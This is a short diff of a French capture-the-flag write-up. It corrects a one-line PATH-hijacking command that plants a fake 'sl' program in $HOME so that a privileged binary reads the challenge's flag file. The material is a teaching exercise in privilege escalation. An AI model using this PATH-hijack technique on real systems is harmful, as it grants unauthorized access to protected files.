@@ -72,7 +72,7 @@ chmod a+x prog.bin
 
 Il suffit d'altérer le `PATH` and ajoutant un programme `sl` (par exemple) avant `/usr/bin`. Ce programme sera exécuté avec les privilèges de l'utilisateur `defi1-drapeau` et permettra de consulter le fichier `drapeau.txt`.
 ```bash
-echo "cat drapeau.txt" > sl; chmod a+x sl; PATH=$HOME:$PATH ; echo 3 | ./prog.bin
+echo "cat drapeau.txt" > $HOME/sl; chmod a+x $HOME/sl; PATH=$HOME:$PATH ; echo 3 | ./prog.bin
 ```
 
 ## Le drapeau
